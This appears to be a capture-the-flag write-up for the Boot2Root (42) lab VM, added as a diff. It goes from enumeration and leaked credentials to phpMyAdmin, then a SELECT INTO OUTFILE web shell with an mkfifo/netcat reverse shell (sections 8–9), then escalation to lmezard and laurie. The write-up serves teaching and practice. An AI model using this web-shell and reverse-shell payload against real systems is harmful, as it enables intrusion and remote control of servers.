@@ -1,0 +1,405 @@
+# Boot2Root (42) Write-up – Method 1
+
+## 1. Machine Setup
+
+When We started the Boot2Root virtual machine, it did not receive an IP address automatically. Since the target was running inside VirtualBox, I created a **Host-Only Network Adapter (`vboxnet0`)** to allow communication between my host machine and the virtual machine.
+
+After configuring the network, I scanned the subnet to identify the target.
+
+```bash
+nmap -sn 192.168.56.0/24
+```
+
+The scan revealed the Boot2Root machine at:
+
+```
+192.168.56.101
+```
+
+---
+
+## 2. Port Scanning
+
+Once the target IP was identified, I performed a service scan with Nmap to discover the exposed services.
+
+```bash
+nmap -sV -sC -p- -T5 -Pn 192.168.56.101
+```
+output:
+```
+Nmap scan report for 192.168.56.101
+Host is up (0.00057s latency).
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT    STATE SERVICE    VERSION
+21/tcp  open  ftp        vsftpd 2.0.8 or later
+|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
+22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
+|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
+|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
+80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Hack me if you can
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+143/tcp open  imap       Dovecot imapd
+|_ssl-date: 2026-06-20T12:32:41+00:00; -3s from scanner time.
+|_imap-capabilities: IDLE ID STARTTLS more have ENABLE capabilities LITERAL+ listed post-login SASL-IR Pre-login OK LOGINDISABLEDA0001 LOGIN-REFERRALS IMAP4rev1
+443/tcp open  ssl/http   Apache httpd 2.2.22
+| ssl-cert: Subject: commonName=BornToSec
+| Not valid before: 2015-10-08T00:19:46
+|_Not valid after:  2025-10-05T00:19:46
+|_ssl-date: 2026-06-20T12:32:41+00:00; -2s from scanner time.
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+993/tcp open  ssl/imaps?
+|_ssl-date: 2026-06-20T12:32:41+00:00; -2s from scanner time.
+| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
+| Not valid before: 2015-10-08T20:57:30
+|_Not valid after:  2025-10-07T20:57:30
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun 20 13:32:44 2026 -- 1 IP address (1 host up) scanned in 37.39 seconds
+```
+
+The scan returned the following open ports:
+
+| Port    | Service |
+| ------- | ------- |
+| 21/tcp  | FTP     |
+| 22/tcp  | SSH     |
+| 80/tcp  | HTTP    |
+| 143/tcp | IMAP    |
+| 443/tcp | HTTPS   |
+| 993/tcp | IMAPS   |
+
+This indicated that the machine exposed multiple network services, including web applications and mail services, making web enumeration a logical next step.
+
+---
+
+## 3. Web Enumeration
+
+I began by enumerating directories on the web server using a directory brute-forcing tool.
+
+Example command:
+
+```bash
+ffuf -u https://192.168.56.101/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
+```
+
+The enumeration revealed several interesting paths:
+
+```
+cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 127ms]
+forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 85ms]
+phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 119ms]
+server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 62ms]
+webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 1ms]
+```
+
+The most interesting directories were:
+
+* `/forum`
+* `/phpmyadmin`
+* `/webmail`
+
+Since forums often contain user discussions, configuration information, or accidentally exposed credentials, I decided to investigate the **forum** first.
+
+---
+
+## 4. Credential Discovery
+
+While browsing the forum, I found that sensitive information had been unintentionally exposed inside the forum posts where some users shared ssh logs (https://192.168.56.101/forum/index.php?mode=thread&id=6).
+
+![screenshot](screenshots/1.png)
+
+The following credentials were visible:
+
+- Login(the username of the poster): `lmezard`
+- Password(from an ssh attempt the user uses the password as username): `!q\]Ej?*5K5cy*AJ`
+
+This is a common example of **credential leakage**, where users accidentally post or expose authentication information inside public or semi-public content.
+
+At this stage, I had obtained:
+
+**Username**
+```
+lmezard
+```
+
+**Password**
+```
+!q\]Ej?*5K5cy*AJ
+```
+
+---
+
+## 5. Webmail Access
+
+Using the credentials found in the forum (`lmezard` / `!q\]Ej?*5K5cy*AJ`), I logged into the **HackMe** forum's user profile page, which confirmed the account was tied to the mailbox `laurie@borntosec.net`:
+
+- **User name:** Imezard
+- **E-mail:** laurie@borntosec.net
+
+Since `/webmail/` (SquirrelMail) was one of the directories discovered during enumeration, I tried the same credentials there and successfully logged in as `laurie@borntosec.net`.
+
+Inside the INBOX, there were two messages from `qudevide@mail.borntosec.net`:
+
+1. **"DB Access"**
+2. **"Very interesting !!!!"**
+
+Opening the **"DB Access"** email revealed a MySQL root credential shared over email:
+
+```
+Subject: DB Access
+From: qudevide@mail.borntosec.net
+To: laurie@borntosec.net
+
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+```
+
+This is another example of **credential leakage** — this time database administrator credentials sent in plaintext over internal email.
+
+---
+
+## 6. phpMyAdmin Access
+
+`/phpmyadmin/` was also flagged during the initial directory enumeration. Using the MySQL root credentials leaked in the email (`root` / `Fg-'kKXBj87E:aJ$`), I logged into phpMyAdmin successfully, confirming:
+
+- **User:** root@localhost
+- **Server:** Localhost via UNIX socket
+- **MySQL version:** 5.5.44-0ubuntu0.12.04.1
+- **Web server:** Apache/2.2.22 (Ubuntu)
+
+Databases visible: `forum_db`, `information_schema`, `mysql`, `performance_schema`, `phpmyadmin`.
+
+---
+
+## 7. Locating a Writable, Web-Accessible Directory for the Web Shell
+
+Having root access on MySQL doesn't by itself tell you *where* on disk you can safely drop a file that Apache will also serve — `INTO OUTFILE` needs a directory that is both **writable by the `mysql` OS user** and **inside the web root**. To find candidate directories, I fuzzed inside `/forum/` specifically:
+
+```bash
+ffuf -u https://192.168.56.101/forum/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt
+```
+
+```
+.htpasswd               [Status: 403, Size: 298, Words: 21, Lines: 11, Duration: 7ms]
+.htaccess               [Status: 403, Size: 298, Words: 21, Lines: 11, Duration: 81ms]
+backup                  [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 1276ms]
+config                  [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 61ms]
+images                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 21ms]
+includes                [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 3ms]
+js                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 182ms]
+lang                    [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 95ms]
+modules                 [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 150ms]
+templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 74ms]
+themes                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 306ms]
+update                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 322ms]
+```
+
+Sensitive-looking directories (`backup`, `config`, `.htaccess`, `.htpasswd`) all returned **403 Forbidden**, ruling them out. However, the remaining **301** directories were not, by themselves, distinctive — Apache's directory listing (`mod_autoindex`) turned out to be enabled broadly across the application's folder structure (e.g. browsing into `modules/geshi/geshi/` also shows a full directory index), so HTTP status alone doesn't tell you which of these directories is actually *writable* by the web server/MySQL process — it only tells you they're browsable.
+
+The real reason `templates_c` was chosen is **prior knowledge of the application's architecture**: MyLittleForum uses the Smarty templating engine, and `templates_c` is Smarty's well-known **compiled-templates cache directory** (confirmed by inspecting the application's own source at https://github.com/My-Little-Forum/mylittleforum/tree/master/templates_c). Because Smarty needs to write freshly compiled `.php` files there every time a template changes, this directory has to remain writable by the web server's OS user by design — unlike static asset folders (`images`, `js`, `themes`) or read-only source folders (`modules`), which have no functional reason to be writable.
+
+So the target directory was identified through **application-specific reasoning about Smarty's runtime behavior**, not from the fuzzing status codes themselves — the fuzzing scan only confirmed the directory was reachable over HTTP at all.
+
+---
+
+## 8. Remote Code Execution via `SELECT ... INTO OUTFILE`
+
+Having root access on the MySQL server through phpMyAdmin, I abused the **`SELECT ... INTO OUTFILE`** feature to write a PHP web shell directly into the web root, since the MySQL user had file-write privileges and the web server's `templates_c` directory was writable.
+
+Query executed via the phpMyAdmin SQL tab:
+
+```sql
+SELECT '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.56.1 4444 >/tmp/f"); ?>'
+INTO OUTFILE '/var/www/forum/templates_c/reverseshell.php'
+```
+
+This writes a PHP payload that spawns a reverse shell back to my attacking machine (`192.168.56.1`) on port `4444`, using a named pipe (`mkfifo`) to get a fully interactive shell via netcat.
+
+The query executed successfully (`Query took 0.0011 sec`), confirming the file was written.
+
+---
+
+## 9. Triggering the Web Shell and Gaining a Shell as `www-data`
+
+Before triggering the payload, I set up a listener on my host:
+
+```bash
+nc -lvnp 4444
+```
+
+I then requested the dropped file through the browser / curl:
+
+```
+http://192.168.56.101/forum/templates_c/reverseshell.php
+```
+
+This triggered the payload and gave me a connection back on my listener:
+
+```
+Connection from 192.168.56.101:53400
+sh: 0: can't access tty; job control turned off
+```
+
+I upgraded the shell to a proper interactive TTY:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+(`python3` was not available on the target, so I fell back to `python`.)
+
+I then backgrounded netcat, set the terminal to raw mode, and foregrounded it again to get a fully interactive shell with working job control:
+
+```bash
+^Z
+stty raw -echo; fg
+export TERM=xterm-256color
+```
+
+At this point I had a shell as the web server user:
+
+```
+www-data@BornToSecHackMe:/var/www/forum/templates_c$
+```
+
+---
+
+## 10. Local Enumeration and Privilege Escalation to `lmezard`
+
+From the `www-data` shell, I enumerated `/home`:
+
+```
+www-data@BornToSecHackMe:/home$ ls -la
+drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net  60 Oct 15  2015 laurie@borntosec.net
+dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+drwxr-x--- 1 zaz                  zaz                  220 Jul  5 16:48 zaz
+```
+
+The `LOOKATME` directory was readable by `www-data` and contained a `password` file:
+
+```
+www-data@BornToSecHackMe:/home$ cat LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+```
+
+This exposed a **system-level** password for the `lmezard` account (different from the forum-account password found earlier, showing the same user reused/rotated credentials across services). Using this, I switched user:
+
+```bash
+su lmezard
+Password:
+```
+
+```
+lmezard@BornToSecHackMe:/home$ id
+uid=1001(lmezard) gid=1001(lmezard) groups=1001(lmezard)
+```
+
+I now had a shell as the local user `lmezard`.
+
+I also noted, while reviewing `/var/log/auth.log` earlier as part of enumeration, repeated SSH brute-force attempts from external IPs (`161.202.39.38`) against invalid users (`test`, `admin`, `nagios`, `adam`), one of which had a failed password visible in the log matching the same leaked forum password (`!q\]Ej?*5K5cy*AJ`) — confirming this password had been used/attempted for SSH as well, though I did not use SSH brute-forcing myself (per the assignment rules) and only observed this as pre-existing log data.
+
+In `lmezard`'s home directory (`/home/lmezard`, otherwise unreadable to other users):
+
+```
+lmezard@BornToSecHackMe:~$ ls -la
+-rw-r--r-- 1 root     root         1 Oct 15  2015 .bash_history
+-rwxr-x--- 1 lmezard  lmezard 808960 Oct  8  2015 fun
+-rwxr-x--- 1 lmezard  lmezard     96 Oct 15  2015 README
+```
+
+```
+lmezard@BornToSecHackMe:~$ cat README
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+```
+
+This indicates the next privilege-escalation step is a **binary reverse-engineering challenge** (`fun`): solving it should yield the SSH password for the `laurie` user.
+
+---
+
+## 11. Reversing the `fun` Binary and Escalating to `laurie`
+
+Extracting the `fun` file revealed it wasn't a normal ELF binary but a **tar archive** containing hundreds of `.pcap` files:
+
+```bash
+tar -xvf fun
+```
+
+```
+ft_fun/C4D03.pcap
+ft_fun/GKGEP.pcap
+ft_fun/A5GPY.pcap
+...
+```
+
+Each `.pcap` file, once inspected, turned out to carry a small fragment of C source code embedded as packet payload, with a marker (`file[0-9]+`) indicating the fragment's order in the reconstructed file. I reassembled the source by extracting the fragments in the correct numeric order and stripping the marker prefixes:
+
+```bash
+cd ft_fun
+grep -oH 'file[0-9]\+' * | sort -V -t: -k2 | cut -d: -f1 | xargs sed 's/\/file[0-9]\+//g' > fun.c
+```
+
+The resulting `fun.c` (included in `scripts/fun.c`) revealed the program's real logic, padded with **thousands of decoy `useless()` functions** wrapped in comment blocks — a simple anti-analysis technique meant to make static analysis and manual reading tedious.
+
+Stripped of the noise, the program was straightforward: twelve functions (`getme1()` through `getme12()`) each return a single hardcoded character, concatenated together in `main()`:
+
+```c
+char getme1()  { return 'I'; }
+char getme2()  { return 'h'; }
+char getme3()  { return 'e'; }
+char getme4()  { return 'a'; }
+char getme5()  { return 'r'; }
+char getme6()  { return 't'; }
+char getme7()  { return 'p'; }
+char getme8()  { return 'w'; }
+char getme9()  { return 'n'; }
+char getme10() { return 'a'; }
+char getme11() { return 'g'; }
+char getme12() { return 'e'; }
+```
+
+Concatenated, these spell:
+
+```
+Iheartpwnage
+```
+
+Per the README instructions ("complete this little challenge and use the result as password for user 'laurie'"), and per the assignment's general note about bin-bomb-style challenges expecting a SHA-256 of the recovered value, I hashed the string:
+
+```
+330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
+
+Using this SHA-256 digest as the password, I logged in via SSH as `laurie`:
+
+```bash
+ssh laurie@192.168.56.101
+```
+
+```
+laurie@BornToSecHackMe:~$ id
+uid=1XXX(laurie) gid=1XXX(laurie) groups=1XXX(laurie)
+```
+
+This confirms local access as the `laurie` user, the next pivot point toward root.
+
+---
+
+## 12. Next Steps
+
+- Enumerate `laurie`'s home directory and privileges (`sudo -l`, group memberships, readable files).
+- Check for SUID/SGID binaries, writable cron jobs, and kernel version for privilege escalation to root.
+- Document the final root escalation step to complete Method 1.
